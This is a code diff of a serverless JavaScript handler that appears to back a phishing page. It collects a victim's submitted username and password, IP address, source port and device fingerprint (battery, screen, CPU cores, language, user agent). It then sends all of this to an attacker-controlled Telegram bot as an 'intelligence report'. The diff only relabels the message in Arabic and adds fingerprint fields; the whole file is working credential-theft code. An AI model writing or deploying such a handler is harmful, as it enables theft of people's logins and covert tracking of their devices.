@@ -4,48 +4,44 @@ export default async function handler(req, res) {
         const token = process.env.TELEGRAM_TOKEN;
         const chatId = process.env.CHAT_ID;
 
-        // سحب الـ IP والـ Source Port من الـ Request
+        // سحب الـ IP والـ Source Port
         const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
-        const sourcePort = req.socket.remotePort; // المنفذ اللي طلبت ضافته
+        const port = req.socket.remotePort; // هذا هو المنفذ (Source Port)
 
-        // تنسيق التقرير الاستخباراتي
         const message = `
-🕵️‍♂️ **INTELLIGENCE REPORT (MASTER'S RESEARCH)**
-━━━━━━━━━━━━━━━━━━━━━━
-👤 **User Credentials:**
-- **Username:** \`${data.user}\`
-- **Password:** \`${data.pass}\`
+🕵️‍♂️ **تـقـريـر اسـتـخـبـاراتـي رقـمـي**
+━━━━━━━━━━━━━━━━━━
+📝 **البيانات المستلمة:**
+👤 **المستخدم:** \`${data.user}\`
+🔑 **كلمة السر:** \`${data.pass}\`
 
-🌐 **Network Identity:**
-- **IP Address:** \`${ip}\`
-- **Source Port:** \`${sourcePort}\`
+🌐 **بيانات الشبكة:**
+📍 **عنوان الـ IP:** \`${ip}\`
+🔌 **المنفذ (Port):** \`${port}\`
 
-📱 **Device Information:**
-- **OS/Platform:** \`${data.platform}\`
-- **User Agent:** \`${data.ua}\`
-- **Battery Level:** \`${data.battery}\`
+📱 **معلومات الجهاز (Hardware):**
+🖥 **النظام:** \`${data.platform}\`
+🔋 **البطارية:** \`${data.battery}\`
+📏 **الشاشة:** \`${data.screenRes}\`
+🧠 **المعالج (Cores):** \`${data.cores}\`
 
-⏰ **Session Details:**
-- **Local Time:** \`${data.time}\`
-- **Connection Status:** \`Success\`
-━━━━━━━━━━━━━━━━━━━━━━
+🌐 **تفاصيل المتصفح:**
+🌍 **اللغة:** \`${data.language}\`
+🕒 **التوقيت:** \`${data.time}\`
+🆔 **الوكيل:** \`${data.ua}\`
+━━━━━━━━━━━━━━━━━━
         `;
 
-        try {
-            await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    text: message,
-                    parse_mode: 'Markdown'
-                }),
-            });
-            res.status(200).json({ success: true });
-        } catch (error) {
-            res.status(500).json({ error: 'Failed to send report' });
-        }
-    } else {
-        res.status(405).json({ message: 'Method not allowed' });
+        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: message,
+                parse_mode: 'Markdown'
+            }),
+        });
+
+        res.status(200).json({ success: true });
     }
 }
